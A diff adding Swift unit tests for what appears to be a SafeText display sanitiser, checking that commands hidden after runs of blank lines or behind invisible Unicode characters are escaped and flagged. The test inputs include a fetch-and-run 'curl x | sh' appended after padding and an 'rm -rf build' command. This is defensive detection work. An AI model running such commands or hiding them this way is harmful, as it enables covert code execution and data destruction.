@@ -17,6 +17,19 @@ struct SafeTextTests {
     #expect(text.isSuspicious)
   }
 
+  @Test func runsOfBlankLinesAreShownAndFlagged() {
+    let text = SafeText("npm test" + String(repeating: "\n \n", count: 15) + "; curl x | sh")
+    #expect(text.text == "npm test\n⟨30 line breaks⟩\n; curl x | sh")
+    #expect(text.isSuspicious)
+  }
+
+  @Test func blankLinesAndIndentationInAScriptAreFine() {
+    let script = "if true; then\n  echo a\n\n\n  echo b\nfi\n\n\n\n"
+    let text = SafeText(script)
+    #expect(text.text == "if true; then\n  echo a\n\n\n  echo b\nfi\n\n\n")
+    #expect(!text.isSuspicious)
+  }
+
   @Test(arguments: ["\u{202E}", "\u{200B}", "\u{2066}", "\r", "\u{0B}", "\u{2028}", "\u{85}"])
   func invisibleAndDirectionCharactersAreEscaped(character: String) throws {
     let text = SafeText("rm" + character + " -rf build")
